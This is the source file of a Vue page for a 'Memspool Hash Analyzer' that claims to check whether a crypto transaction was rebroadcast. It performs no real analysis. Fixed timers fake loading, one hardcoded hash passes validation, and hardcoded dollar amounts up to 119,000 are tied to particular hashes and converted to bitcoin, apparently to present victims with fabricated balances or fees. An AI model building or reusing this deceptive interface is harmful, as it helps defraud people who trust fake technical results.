<template>
  <div class="home">
<!--    <div class="logo-main">-->
<!--      <p class="logo"><span style="color: #f7931a;">Mems</span>Pool Analyzer</p>-->
<!--    </div>-->

    <div class="section-1">
      <p class="text-1">Memspool Hash Analyzer</p>
      <p class="text-2">Utilize your hash ID to efficiently review and visualize your rebroadcast transaction
        within the mempool.</p>

      <form class="input-button-wrapper" @submit.prevent="validateAndSubmit" >
        <!--        <input type="text" required v-model="inputValue" placeholder="TXID (Transaction ID) ..." class="text-input" -->
        <!--               :class="{'input-error': showError}" />-->
        <input
            type="text"
            required
            v-model="inputValue"
            placeholder="Enter Hash Id ..."
            class="text-input"
            @input="clearValidationError"
            :pattern="pattern"
            ref="txidInput"
        />
        <button v-if="!showActionText" class="submit-button">
          <i class='bx bx-right-arrow-alt'></i>
          </button>
      </form>

<!--      <p class="text-3">I want to see how analyzer works</p>-->
      <div class="seprate" v-if="loading === true">
        <span class="loader"></span>
        <p class="loader-text" style="padding-left: 10px;">... please wait</p>
      </div>

    </div>


    <div class="section-2">
      <p class="text-4">Integrated over 30 nounce across 26 chains</p>

      <div class="defi-alpha">
        <img src="@/assets/arbitrum.webp" alt="defi" class="defi">
        <img src="@/assets/avalanche.webp" alt="defi" class="defi">
        <img src="@/assets/base.webp" alt="defi" class="defi">
        <img src="@/assets/blast.webp" alt="defi" class="defi">
        <img src="@/assets/bnb_chain.webp" alt="defi" class="defi">
        <img src="@/assets/celo.webp" alt="defi" class="defi">
        <img src="@/assets/cronos.webp" alt="defi" class="defi">
        <img src="@/assets/eth.webp" alt="defi" class="defi">
        <img src="@/assets/ftm.webp" alt="defi" class="defi">
        <img src="@/assets/hedera.webp" alt="defi" class="defi">
        <img src="@/assets/kcc.webp" alt="defi" class="defi">
        <img src="@/assets/linea.webp" alt="defi" class="defi">
        <img src="@/assets/merlin.png" alt="defi" class="defi">

      </div>

      <div class="defi-alpha">
        <img src="@/assets/okc-logo.webp" alt="defi" class="defi">
        <img src="@/assets/op.webp" alt="defi" class="defi">
        <img src="@/assets/opbnb.svg" alt="defi" class="defi">
        <img src="@/assets/polygon.webp" alt="defi" class="defi">
        <img src="@/assets/pulse.webp" alt="defi" class="defi">
        <img src="@/assets/scroll.svg" alt="defi" class="defi">
        <img src="@/assets/solana-logo.webp" alt="defi" class="defi">
        <img src="@/assets/sonic.webp" alt="defi" class="defi">
        <img src="@/assets/sui.webp" alt="defi" class="defi">
        <img src="@/assets/ton.webp" alt="defi" class="defi">
        <img src="@/assets/tron.webp" alt="defi" class="defi">
        <img src="@/assets/zksync.webp" alt="defi" class="defi">
      </div>
    </div>

  </div>
</template>

<script>
import axios from "axios";
import Toastify from 'toastify-js'
import 'toastify-js/src/toastify.css'

export default {
  name: 'HomeView',
  data() {
    return {
      inputValue: '',
      loading: false,
      loading2: false,
      loading3: false,
      loading4: false,
      loading5: false,
      loading6: false,
      loading7: false,
      loading8: false,
      loading9: false,
      dialogIsVisible: false,
      dialogIsVisible2: false,
      dialogIsVisible3: false,
      dialogIsVisible4: false,
      dialogIsVisible5: false,
      dialogIsVisible6: false,
      dialogIsVisible7: false,
      dialogIsVisible8: false,
      dialogIsVisible9: false,
      showActionText: false, // Controls visibility of action text part
      showActionText2: false, // Controls visibility of action text part
      showActionText3: false, // Controls visibility of action text part
      showActionText4: false, // Controls visibility of action text part
      selectValue: "",
      inputValue3: "",
      inputValue2: '',
      inputValueEth: '',
      bitcoinRate: null,
      ethereumRate: null,
      showError: false, // Add this data property to manage error visibility
      pattern: ".{64,}", // This pattern requires at least 64 characters
    };
  },
  methods: {

    showToast() {
      Toastify({
        text: "This Hash has not been rebroadcasted.",
        duration: 4000,
        close: true,
        gravity: "top", // `top` or `bottom`
        position: "right", // `left`, `center` or `right`
        backgroundColor: "#cc0000",
        stopOnFocus: true, // Prevents dismissing of toast on hover
        onClick: function(){} // Callback after click
      }).showToast();
    },

    async validateAndSubmit() {
      const txidInput = this.$refs.txidInput;

      // Validate length of the input
      if (this.inputValue.length < 62) {
        txidInput.setCustomValidity("Error: Hash ID must be exactly 62 characters long.");
        txidInput.reportValidity(); // Show error message
        return; // Stop further execution
      }

      // Check for specific valid Hash IDs
      const validHashes = [
        '0x1ed4cedfb235556ee5598c902dff761eaa7927b7f869e8b4d04fa1228fb2d9f8',
      ];

      if (validHashes.includes(this.inputValue)) {
        // Swal.fire({
        //   icon: 'success',
        //   title: 'Validation Successful',
        //   text: 'The Hash ID is valid and processed.',
        // });

        this.loading = true; // Show the loader

        // Wait for 4 seconds before showing the action text part
        setTimeout(() => {
          this.loading = false; // Hide the loader
          this.$router.push("/about");
          window.scrollTo(0, 0);
        }, 4000);


        // Update the Vuex store and clear the input
        this.$store.commit('updateHash', { inputValue: this.inputValue });
        this.inputValue = "";
      } else {
        // Swal.fire({
        //   icon: 'error',
        //   title: 'Validation Failed',
        //   text: 'This Hash has not been rebroadcasted.',
        // });
        this.loading = true; // Show the loader

        // Wait for 4 seconds before showing the action text part
        setTimeout(() => {
          this.loading = false; // Hide the loader
          this.showToast();
        }, 4000);
      }

      // Clear validation message after processing
      txidInput.setCustomValidity("");
    },


    fetchBitcoinRate() {
      // Set loading to true when the request starts
      this.loading = true;

      // eslint-disable-next-line no-undef
      axios.get('https://api.coindesk.com/v1/bpi/currentprice/BTC.json')
          .then(response => {
            this.bitcoinRate = response.data.bpi.USD.rate_float;
            // Set loading to false when the data is successfully fetched
            this.loading = false;
          })
          .catch(error => {
            console.error(error);
            // Set loading to false also if there is an error
            this.loading = false;
          });
    },

    fetchEthereumRate() {
      // Set loading to true when the request starts
      this.loading = true;

      // Use CoinGecko API to fetch the Ethereum price
      axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
          .then(response => {
            this.ethereumRate = response.data.ethereum.usd;
            // Set loading to false when the data is successfully fetched
            this.loading = false;
          })
          .catch(error => {
            console.error(error);
            // Set loading to false if there is an error
            this.loading = false;
          });
    },

    convertAndSave2() {
      this.inputValue3 = 0;
      const usdAmount = parseFloat(this.inputValue3);
      this.inputValueEth = (usdAmount / this.ethereumRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
    },


    convertAndSave() {
      // Check if inputValue is the specific address
      if (this.inputValue === "0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad") {
        // If the address matches, set inputValue3 to 4000
        this.inputValue3 = 4000;
        console.log(this.inputValue3);
        const usdAmount = parseFloat(this.inputValue3);
        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
      } else if (this.inputValue === "0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6") {
        // If the address matches, set inputValue3 to 2000
        this.inputValue3 = 2000;
        console.log(this.inputValue3);
        const usdAmount = parseFloat(this.inputValue3);
        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
      } else if (this.inputValue === "0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5") {
        // If the address matches, set inputValue3 to 0
        this.inputValue3 = 0;
        console.log(this.inputValue3);
        const usdAmount = parseFloat(this.inputValue3);
        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
      } else if (this.inputValue === "0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4") {
        // If the address matches, set inputValue3 to 7500
        this.inputValue3 = 7500;
        console.log(this.inputValue3);
        const usdAmount = parseFloat(this.inputValue3);
        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
      } else if (this.inputValue === "0xa76b1e3d5c2f9d8403f233ce5a16bc4a928be07f5d61c39b7e4c8a01e456ba98") {
        // If the address matches, set inputValue3 to 20600
        this.inputValue3 = 20600;
        console.log(this.inputValue3);
        const usdAmount = parseFloat(this.inputValue3);
        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
      } else {
        // Proceed with the conversion using the normal inputValue3
        this.inputValue3 = 119000;
        console.log(this.inputValue3);
        const usdAmount = parseFloat(this.inputValue3);
        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
      }
    },






    clearValidationError() {
      const txidInput = this.$refs.txidInput;
      txidInput.setCustomValidity(""); // Clear the validation error when the user types
    },

    handleClick() {
      console.log('Input Value:', this.inputValue);
      this.loading = true; // Show the loader

      // Wait for 3 seconds before showing the action text part
      setTimeout(() => {
        this.loading = false; // Hide the loader
        this.showActionText = true; // Show the action text part
      }, 3000);
    },


    handleClick3() {
      this.loading4 = true; // Show the loader

      // Wait for 3 seconds before showing the action text part
      setTimeout(() => {
        this.loading4 = false; // Hide the loader
        this.showActionText2 = true; // Show the action text part
      }, 3000);
    },

    handleClick4() {
      console.log('Input Value:', this.inputValue);
      this.loading6 = true; // Show the loader

      // Wait for 3 seconds before showing the action text part
      setTimeout(() => {
        this.loading6 = false; // Hide the loader
        this.showActionText4 = true; // Show the action text part
      }, 3000);
    },

    handleClick5() {
      if (this.inputValue === '0x186fdefc2952480f6739b7a30d5028cb1pc8497412edc9f99cec25c05c86df54') {
        this.loading7 = true; // Show the loader

        // Wait for 3 seconds before showing the action text part
        setTimeout(() => {
          this.loading7 = false; // Hide the loader
          // this.showActionText2 = true; // Show the action text part
          this.showDialog6() // show third modal
        }, 3000);
      } else {
        //  block of code to be executed if the condition is false
        this.loading7 = true; // Show the loader

        // Wait for 3 seconds before showing the action text part
        setTimeout(() => {
          this.loading7 = false; // Hide the loader
          // this.showActionText2 = true; // Show the action text part
          this.showDialog3() // show third modal
        }, 3000);
      }
    },

    hideDialog() {
      this.dialogIsVisible = false;
      this.showActionText = false; // close the action text part
      this.showActionText2 = false; // close the action text part
      this.loading3 = true; // Show the loader
      this.inputValue = "";
    },
    showDialog() {

      this.loading5 = true; // Show the loader

      // Wait for 3 seconds before showing the action text part
      setTimeout(() => {
        this.loading5 = false; // Hide the loader
        this.dialogIsVisible = true;
        this.convertAndSave()
        this.convertAndSave2()
        this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
        this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
        this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
      }, 3000);
    },

    hideDialog2() {
      this.dialogIsVisible2 = false;
    },
    showDialog2() {
      this.dialogIsVisible2 = true;
    },

    hideDialog3() {
      this.dialogIsVisible3 = false;
      this.showActionText = false; // close the action text part
      this.showActionText2 = false; // close the action text part
      this.showActionText3 = false; // close the action text part
      this.showActionText4 = false; // close the action text part
      this.loading8 = false; // Show the loader
      this.inputValue = "";
    },
    showDialog3() {

      this.dialogIsVisible3 = true;
      this.convertAndSave()
      this.convertAndSave2()
      this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
      this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
      this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
    },

    hideDialog4() {
      this.dialogIsVisible4 = false;
      this.showActionText = false; // close the action text part
      this.showActionText2 = false; // close the action text part
      this.showActionText3 = false; // close the action text part
      this.showActionText4 = false; // close the action text part
      this.loading8 = true; // Show the loader
      this.inputValue = "";
    },
    showDialog4() {
      this.dialogIsVisible4 = true;
      this.convertAndSave()
      this.convertAndSave2()
      this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
      this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
      this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
    },

    hideDialog5() {
      this.dialogIsVisible5 = false;
      this.showActionText = false; // close the action text part
      this.showActionText2 = false; // close the action text part
      this.showActionText3 = false; // close the action text part
      this.showActionText4 = false; // close the action text part
      this.loading8 = true; // Show the loader
      this.inputValue = "";
    },
    showDialog5() {
      this.dialogIsVisible5 = true;
      this.convertAndSave()
      this.convertAndSave2()
      this.$store.commit('updateConvertedEth', { inputValueEth: this.inputValueEth });
      this.$store.commit('updateLoginForm', { inputValue2: this.inputValue2 });
      this.$store.commit('updateAmountForm', { inputValue3: this.inputValue3 });
    },

    hideDialog6() {
      this.dialogIsVisible6 = false;
      this.showActionText = false; // close the action text part
      this.showActionText2 = false; // close the action text part
      this.showActionText3 = false; // close the action text part
      this.showActionText4 = false; // close the action text part
      this.loading8 = false; // Show the loader
      this.inputValue = "";
    },
    showDialog6() {
      this.dialogIsVisible6 = true;
    },

    hideDialog7() {
      this.dialogIsVisible7 = false;
      this.showActionText = false; // close the action text part
      this.showActionText2 = false; // close the action text part
      this.showActionText3 = false; // close the action text part
      this.showActionText4 = false; // close the action text part
      this.loading8 = false; // Show the loader
      this.inputValue = "";
    },
    showDialog7() {
      this.dialogIsVisible7 = true;
    },

    hideDialog8() {
      this.dialogIsVisible8 = false;
      this.showActionText = false; // close the action text part
      this.showActionText2 = false; // close the action text part
      this.showActionText3 = false; // close the action text part
      this.showActionText4 = false; // close the action text part
      this.loading8 = false; // Show the loader
      this.inputValue = "";
    },
    showDialog8() {
      this.dialogIsVisible8 = true;
    },

    hideDialog9() {
      this.dialogIsVisible9 = false;
      this.showActionText = false; // close the action text part
      this.showActionText2 = false; // close the action text part
      this.showActionText3 = false; // close the action text part
      this.showActionText4 = false; // close the action text part
      this.loading8 = false; // Show the loader
      this.inputValue = "";
    },
    showDialog9() {
      this.dialogIsVisible9 = true;
    },
  },




  created() {
    this.fetchBitcoinRate()
    this.fetchEthereumRate()
  },
  mounted() {
    this.fetchBitcoinRate()
    this.fetchEthereumRate()
  }
}
</script>


<style scoped>
/* index.css or in <style> of App.vue */
@import url('https://fonts.googleapis.com/css2?family=Peralta&display=swap');

.input-error {
  border: 1px solid red;
}

.error-message {
  color: red;
  font-size: 0.875rem;
  margin-top: 5px;
}

.bx-right-arrow-alt{
  font-size: 1.25rem;
}

.defi{
  width: 3%;
  object-fit: contain;
}

.defi-alpha{
  display: flex;
  justify-content: center;
  align-items: center;
  align-content: center;
  gap: 1.1rem;
  margin-bottom: 10px;
}

.section-1{
  width: 60%;
  margin-left: auto;
  margin-right: auto;
  --tw-bg-opacity: 1;
  background-color: rgb(7 12 20 / var(--tw-bg-opacity));
  padding: 3.5rem 2.5rem 6rem 2.5rem;
  border-radius: 10px;
  box-shadow: rgba(7, 12, 20, 0.2) 0px 2px 8px 0px;
  margin-top: 6%;
}

.section-2{
  margin-top: 13%;
  width: 60%;
  margin-left: auto;
  margin-right: auto;
}

.logo{
  text-align: center;
  font-family: 'Peralta', serif;
  font-size: 60px;
  font-weight: normal;
  color: #007bff;
}

.logo-main{
  padding: 2.5rem 2.5rem;
  margin-bottom: 2rem;
  background-color: #e9ecef;
}

.input-button-wrapper {
  display: flex;
  align-items: center;
  margin-top: 2%;
}

.text-input {
  flex: 1;
  padding: 10px 15px;
  font-size: 16px;
  border: 1px solid rgb(20 27 44);
  background-color: rgb(20 27 44);
  border-radius: 4px 0 0 4px;
  color: rgb(212 235 255);
}

.text-input::placeholder {
  font-size: 13px;
  color: rgb(212 235 255);
}

.submit-button {
  padding: 9px 20px;
  font-size: 16px;
  background-image: linear-gradient(87.71deg, #38ffea 3.28%, #72a2ff 114.54%);
  color: white;
  border: none;
  border-radius: 0 4px 4px 0;
  cursor: pointer;
  display: flex;
  justify-content: center;
  align-items: center;
  align-content: center;
}

.submit-button:hover {
  background-color: #0056b3;
  border-color: #0056b3;
}

.submit-button-2 {
  padding: 8px 25px;
  font-size: 16px;
  background-color: #0056b3;
  color: white;
  border: 1px solid #0056b3;
  border-radius: 0 4px 4px 0;
  cursor: pointer;
  display: inline-block;
}

.submit-button-2:hover {
  background-color: #0056b3;
  border-color: #0056b3;
}

hr.new1 {
  margin-top: 0.7rem;
  margin-bottom: 0.7rem;
  border: 0;
  border-top: 1px solid rgba(0, 0, 0, .1);
}

.section-1-text-1{
  line-height: 1.55;
}

.text-1{
  font-size: 2rem;
  color: rgb(212 235 255);
  font-family: 'BR-Firma-Regular', sans-serif;
  text-align: center;
}

.text-2{
  padding-top: 2%;
  padding-bottom: 1.5%;
  font-size: 1rem;
  color: rgb(212 235 255);
  font-family: 'BR-Firma-Light', sans-serif;
  text-align: center;
}

.text-3{
  padding-top: 4%;
  padding-bottom: 1%;
  font-family: 'BR-Firma-Regular', sans-serif;
  text-decoration: underline;
  text-align: center;
  color: rgb(212 235 255);
}

.text-4{
  padding-top: 1%;
  padding-bottom: 2%;
  text-align: center;
  font-family: 'BR-Firma-Regular', sans-serif;
  color: rgb(212 235 255);
}

.text-5{
  padding-top: 1%;
  padding-bottom: 1%;
  font-size: 1.2rem;
  font-family: 'BR-Firma-Bold', sans-serif;
  font-weight: bold;
}

.text-6{
  padding-top: 1%;
  padding-bottom: 1%;
}

.text-7{
  padding-top: 0.5%;
  padding-bottom: 0.5%;
}

.text-8{
  padding-top: 1%;
  padding-bottom: 1%;
}
span{
  font-family: 'BR-Firma-Bold', sans-serif;
  font-weight: bold;
}
.premium{
  color: #007bff;
  font-family: 'BR-Firma-Regular', sans-serif;
  font-weight: lighter;
}
.lawrence{
  display: flex;
}
.sep{
  font-size: 20px;
  padding-right: 5px;
  font-weight: bold;
}

.loader {
  width: 82%;
  height: 4.8px;
  display: inline-block;
  position: relative;
  background: rgba(255, 255, 255, 0.15);
  overflow: hidden;
}
.loader::after {
  content: '';
  width: 192px;
  height: 4.8px;
  background: #007bff;
  position: absolute;
  top: 0;
  left: 0;
  box-sizing: border-box;
  animation: animloader 2s linear infinite;
}

.loader-text{
  color: rgb(212 235 255);
}




@keyframes animloader {
  0% {
    left: 0;
    transform: translateX(-100%);
  }
  100% {
    left: 100%;
    transform: translateX(0%);
  }
}

.seprate{
  display: flex;
  justify-content: center;
  align-items: center;
  align-content: center;
  margin-top: 20px;
  margin-bottom: 20px;
}

.action-text-part{
  background-color: #007bff;
  padding: 20px;
  margin-top: 20px;
}

.action-text-part-text-1{
  color: #FFFFFF;
  padding-bottom: 15px;
}

.price-container{
  display: flex;
  justify-content: space-between;
  align-items: center;
  align-content: center;
  margin-top: 20px;
}

.price-container-1{
  display: flex;
  align-items: center;
  align-content: center;
  gap: 5px;
}

.price-container-text-1{
  font-weight: bold;
  font-family: 'BR-Firma-Bold', sans-serif;
  font-size: 22px;
}

.price-container-text-2{
  color: #FFFFFF;
  background-color: #007bff;
  height: 32px;
  padding: 5px;
  font-size: 18px;
  border-radius: 5px;
}

.price-container-text-3{
  color: green;
  background-color: transparent;
  border: 1px solid green;
  padding: 5px 7px;
  font-size: 16px;
  height: 32px;
  border-radius: 5px;
  cursor: pointer;
}

.price-container-text-3:hover{
  color: #ffffff;
  background-color: green;
  border: 1px solid green;
}

.info-container{
  margin-top: 20px;
}


.loader2 {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  display: block;
  margin:5px auto;
  position: relative;
  color: #007bff;
  left: -200px;
  box-sizing: border-box;
  animation: shadowRolling 2s linear infinite;
}

@keyframes shadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }
  12% {
    box-shadow: 100px 0 #007bff, 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }
  25% {
    box-shadow: 110px 0 #007bff, 100px 0 #007bff, 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }
  36% {
    box-shadow: 120px 0 #007bff, 110px 0 #007bff, 100px 0 #007bff, 0px 0 rgba(255, 255, 255, 0);
  }
  50% {
    box-shadow: 130px 0 #007bff, 120px 0 #007bff, 110px 0 #007bff, 100px 0 #007bff;
  }
  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 #007bff, 120px 0 #007bff, 110px 0 #007bff;
  }
  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 #007bff, 120px 0 #007bff;
  }
  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 #007bff;
  }
  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}


@keyframes bblFadInOut {
  0%, 80%, 100% { box-shadow: 0 2.5em 0 -1.3em }
  40% { box-shadow: 0 2.5em 0 0 }
}


@media (max-width: 990px) {
  .section-1{
    width: 90%;
    margin-left: auto;
    margin-right: auto;
  }
}

@media (max-width: 700px){
  .loader-text{
    font-size: 13px;
  }
  .input-button-wrapper {
    margin-top: 10%;
  }
  .section-1{
    padding: 3.5rem 2.5rem 4rem 2.5rem;
    margin-top: 10%;
  }

  .seprate{
    margin-top: 20px;
    margin-bottom: unset;
  }

  .defi{
    width: 6%;
    object-fit: contain;
    white-space: nowrap;
  }



}

@media (max-width: 500px){

}

</style>
